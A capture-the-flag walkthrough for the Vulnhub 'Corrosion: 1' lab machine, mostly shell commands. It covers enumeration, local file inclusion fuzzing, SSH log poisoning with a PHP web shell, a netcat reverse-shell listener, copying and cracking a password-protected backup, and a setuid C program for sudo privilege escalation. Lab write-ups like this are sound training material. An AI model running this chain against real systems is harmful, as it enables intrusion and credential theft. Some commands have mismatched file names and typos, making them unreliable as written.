Vulnhub - Corrosion: 1 Walkthrough

Video link for the walkthrough: https://www.youtube.com/watch?v=p8q_MPer3Ro&list=PL_Bj4ZvhLa37QWivDC6chQTanrxqdjWrh&index=2

get the IP address of the vulnerable machine
$sudo arp-scan -l

now do an nmap scan
$nmap -sC -sV -p- <ip_vulnerablemachine>

you will find two ports open 22, 80

go to firefox and you will find the default Apache2 webpage

now run the gobuster scan
gobuster dir -u http://<ip_vulnerablemachine> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt

you will find two relevant file and directories
/index.html
/tasks
/blog-post

<ip_vulnerablemachine>/tasks/

you will get the todo list

<ip_vulnerablemachine>/blog-post/

now run a gobuster scan on this directory
gobuster dir -u http://<ip_vulnerablemachine>/blog-post/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt

you will get three more directories
/index.html
/archives
/uploads

check all the folders

get the <ip_vulnerablemachine>/blog-post/archives/andylogs.php

now lets run wfuzz
$wfuzz -u http://<ip_vulnerablemachine>/blog-post/archives/andylogs.php?RUZZ=/etc/passwd -w /usr/share/wordlists/dirb/common.txt --hw=65 --hh=0

you can use 'file' in the place of fuzz

try
/etc/passwd
id
/var/log/auth.log

you can try getting the shell using php
$ssh '<?php system($_GET[cmd]);?>'@<ip_vulnhubmachine>

now if you check the /var/log/auth.log you will be able to see the id of the username

check which version of python is running
which python3

lets try getting reverse shell
check payloadallthethings

now on your kali machine 
$nc -lvnp 1234

check the ip address of the kali machine

now use the kali IP address on the reverse shell payload along with the port number

you will be able to login as www-data

now spawn the shell

$ python3 -c "import pty;pty.spawn('/bin/bash')"
# import term=XTERM

go to the home folder
you will get another user

check the permissions to execute the files
$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

go to the /var/backups folder

copy the file to /var/backups
also download the files to your local kali machine
$python3 -m http.server

now copy the file
$wget http://<ip_vulnhubmachine>/user_backup.zip

$unzip user_backup.zip
the file is password protected

to crack the password we will use fcrack
also make sure you have rockyou.txt file as well

$fcrackzip -v -u -D -p rockyou.txt user_backup.zip

use the password to unzip the file

you will get the relevant files

cat the password file and use the password to login to the machine
$ssh randy@<ip_vulnhubmachine>

$sudo -l
you will get this file /home/randy/tools/easysysinfo

go to the tools folder
take a look at the file 

get the file on your kali machine

modify the easysysinfo.c file and use it for privilege escalation

delete whatever is there in the file and type this code

#include <unistd.h>
int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash");
}

now copy this file back to the vulnerable machine

now make binary of the file
$gcc easysysinfo.c -o esinfo
$chmod 4755 easysysinfo
$sudo ./easysysinfo

now you will get the root flag
